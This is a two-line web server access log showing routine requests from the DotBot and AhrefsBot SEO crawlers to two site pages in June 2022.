216.244.66.229 - - [22/Jun/2022:02:18:59 +0000] "GET /node/363/feed HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
51.222.253.17 - - [22/Jun/2022:02:22:07 +0000] "GET /node/446/ HTTP/2.0" 200 10155 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
